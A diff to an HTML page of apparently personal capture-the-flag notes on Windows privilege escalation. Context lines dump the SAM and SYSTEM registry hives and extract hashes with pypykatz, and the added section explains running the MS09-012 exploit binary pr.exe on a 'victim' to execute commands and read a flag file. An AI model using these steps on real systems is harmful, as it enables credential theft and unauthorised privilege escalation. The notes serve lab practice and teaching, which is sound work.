@@ -108,6 +108,17 @@ reg save hklm\system C:\Users\emily.oscars.CICADA\Documents\system.hive</code></
                         <pre><code class="language-powershell">pypykatz registry --sam sam.hive system.hive</code></pre>    
                     </ul>
                 </div>
+
+                <div class="notion-body">
+                    <h2 id="Sudo & SUID">MS09-012</h2>
+                    <ul>
+                        <p>RCE in the service spooler which will grant us a privielge scalation method. Checkout github repo<a class="notion-link" href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-012/README.md"> here</a></p>
+                        <p>Downlad the pr.exe file, transfer it to the victim and execute any command you want</p>
+                        <pre><code class="language-cmd">pr.exe "whoami"</code></pre>
+                        <p>In case you would like to retrive information about files...👀</p>
+                        <pre><code class="language-powershell">pr.exe "more \"C:\\Documents and Settings\\Harry\\Desktop\\user.txt\""</code></pre>    
+                    </ul>
+                </div>
         </div>
     </div>
 </body>
